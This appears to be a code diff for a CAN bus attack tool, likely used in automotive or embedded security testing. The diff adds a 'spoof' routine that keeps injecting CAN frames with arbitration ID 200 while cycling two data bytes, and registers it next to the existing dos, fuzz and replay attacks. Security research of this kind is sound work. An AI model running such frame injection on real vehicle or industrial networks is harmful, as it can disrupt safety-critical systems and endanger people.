@@ -52,9 +52,30 @@ def replay(manager):
         msg = attack.manager.bus.recv(timeout=1)
         if msg: replay_ref.append(msg)
         
+def spoof(manager):
+    can_data = [0,0,0,0,0,0,0,0]
+    msg = can.Message(arbitration_id=200,
+                          data=can_data,
+                          extended_id=False,
+                          is_error_frame=False)
+
+    while manager.should_continue():
+        manager.attack(msg)
+
+        if(can_data[5] >= 0xFF):
+            can_data[5] = 0
+            if(can_data[4] >= 0xFF):
+                can_data[4] = 0
+            else:
+                can_data[4] += 1
+        else:
+            can_data[5] += 1
+        msg.data = can_data
+
 # all attacks must be registered in this dict of function pointers
 attack_dict = {
         'dos' : dos,
         'fuzz' : fuzz,
         'replay' : replay,
+        'spoof' : spoof,
 }
